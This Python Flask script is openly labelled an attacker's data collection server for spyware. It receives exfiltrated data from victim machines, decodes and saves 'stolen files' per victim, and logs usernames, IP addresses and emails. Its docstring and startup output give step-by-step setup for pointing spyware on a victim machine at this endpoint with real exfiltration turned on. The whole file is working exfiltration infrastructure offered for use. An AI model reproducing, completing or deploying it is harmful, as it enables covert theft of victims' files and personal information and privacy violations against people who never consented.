"""
Attacker's Data Collection Server
Run this on the attacker's machine to receive exfiltrated data from victim

USAGE:
1. Run this script on attacker machine: python attacker_server.py
2. Note the IP address shown (e.g., 192.168.1.100)
3. Update config.py with this IP in ATTACKER_URL
4. Run spyware on victim machine - data will be received here
"""

from flask import Flask, request, jsonify
import json
import os
from datetime import datetime
import socket

app = Flask(__name__)

# Directory to save received data
RECEIVED_DATA_DIR = "received_victim_data"
os.makedirs(RECEIVED_DATA_DIR, exist_ok=True)

@app.route('/receive', methods=['POST'])
def receive_data():
    """
    Endpoint to receive exfiltrated data from victim machines
    """
    try:
        # Get JSON data from victim
        victim_data = request.get_json()
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        victim_hostname = victim_data.get('victim_data', {}).get('system_info', {}).get('hostname', 'unknown')
        filename = f"victim_{victim_hostname}_{timestamp}.json"
        
        # Save JSON to file
        filepath = os.path.join(RECEIVED_DATA_DIR, filename)
        with open(filepath, 'w') as f:
            json.dump(victim_data, f, indent=4)
        
        print("\n" + "="*70)
        print(f"✓ DATA RECEIVED FROM VICTIM!")
        print("="*70)
        print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Hostname: {victim_hostname}")
        print(f"Saved to: {filepath}")
        print(f"Data size: {len(json.dumps(victim_data))} bytes")
        
        # === EXTRACT AND SAVE STOLEN FILES ===
        stolen_files = victim_data.get('stolen_files', [])
        if stolen_files:
            import base64
            
            # Create directory for this victim's files
            victim_files_dir = os.path.join(RECEIVED_DATA_DIR, f"{victim_hostname}_{timestamp}_files")
            os.makedirs(victim_files_dir, exist_ok=True)
            
            print(f"\n📁 STOLEN FILES: {len(stolen_files)} files")
            print("="*70)
            
            for file_info in stolen_files:
                try:
                    filename_stolen = file_info['filename']
                    file_content_b64 = file_info['content']
                    file_size = file_info['size']
                    
                    # Decode base64 and save file
                    file_content = base64.b64decode(file_content_b64)
                    file_path = os.path.join(victim_files_dir, filename_stolen)
                    
                    with open(file_path, 'wb') as f:
                        f.write(file_content)
                    
                    print(f"  ✓ Saved: {filename_stolen} ({file_size} bytes)")
                    
                except Exception as e:
                    print(f"  ✗ Error saving {file_info.get('filename', 'unknown')}: {e}")
            
            print(f"\n📂 Files saved to: {victim_files_dir}")
            print("="*70)
        
        print(f"\n✓ All data processed successfully!")
        print("="*70 + "\n")
        
        # Print victim info
        if 'victim_data' in victim_data and 'system_info' in victim_data['victim_data']:
            info = victim_data['victim_data']['system_info']
            print(f"\nVictim Info:")
            print(f"  - Username: {info.get('username', 'N/A')}")
            print(f"  - OS: {info.get('os', 'N/A')} {info.get('os_release', 'N/A')}")
            print(f"  - IP: {info.get('ip_address', 'N/A')}")
            print(f"  - Email: {info.get('victim_email', 'N/A')}")
        
        print("="*70 + "\n")
        
        return jsonify({
            "status": "success",
            "message": "Data received successfully",
            "timestamp": timestamp
        }), 200
        
    except Exception as e:
        print(f"[ERROR] Failed to receive data: {e}")
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500


@app.route('/status', methods=['GET'])
def status():
    """Check if server is running"""
    return jsonify({
        "status": "online",
        "message": "Attacker server is running",
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })


def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "XXX.X.X.X"


if __name__ == '__main__':
    print("\n" + "="*70)
    print("🎯 ATTACKER DATA COLLECTION SERVER")
    print("="*70)
    print(f"Server starting...")
    
    local_ip = get_local_ip()
    port = 5555
    
    print(f"\n✓ Server running at: http://{local_ip}:{port}")
    print(f"\n📝 SETUP INSTRUCTIONS:")
    print(f"   1. Update config.py with this URL:")
    print(f"      ATTACKER_URL = \"http://{local_ip}:{port}/receive\"")
    print(f"   2. Set USE_REAL_EXFILTRATION = True in config.py")
    print(f"   3. Install requests on victim: pip install requests")
    print(f"   4. Run spyware on victim machine")
    print(f"\n📁 Received data will be saved to: {RECEIVED_DATA_DIR}/")
    print(f"\n⏳ Waiting for victim data...\n")
    print("="*70 + "\n")
    
    # Run server (accessible from network)
    app.run(host='0.0.0.0', port=port, debug=False)
